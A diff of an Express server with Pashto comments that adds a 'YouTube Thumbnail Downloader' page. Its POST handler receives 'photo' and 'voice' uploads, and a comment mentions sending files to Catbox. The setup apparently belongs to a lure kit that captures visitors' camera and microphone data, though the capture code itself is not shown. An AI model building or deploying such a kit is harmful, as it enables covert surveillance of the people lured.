@@ -30,7 +30,7 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- پخواني مسیرونه (سکتورونه) په خپل حال پاتې دي ---
+// --- پخواني مسیرونه (سکتورونه) ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -39,9 +39,13 @@ app.get('/page1', (req, res) => {
     res.sendFile(path.join(__dirname, 'index2.html'));
 });
 
-// --- نوي اضافه شوي مسیرونه د (index3 او index4) لپاره ---
 app.get('/page3', (req, res) => {
     res.sendFile(path.join(__dirname, 'index3.html'));
+});
+
+// --- نوی اضافه شوی مسیر د YouTube Thumbnail Downloader لپاره (/page4) ---
+app.get('/page4', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index4.html'));
 });
 
 // Catbox ته د فایل د اپلوډ کولو فنکشن
@@ -67,8 +71,12 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
     handleIncomingData(req, res);
 });
 
-// د نوي /page3 پاڼې پوسټ ریکویسټونه
 app.post('/page3', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    handleIncomingData(req, res);
+});
+
+// د نوي /page4 پاڼې پوسټ ریکویسټ
+app.post('/page4', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     handleIncomingData(req, res);
 });
 
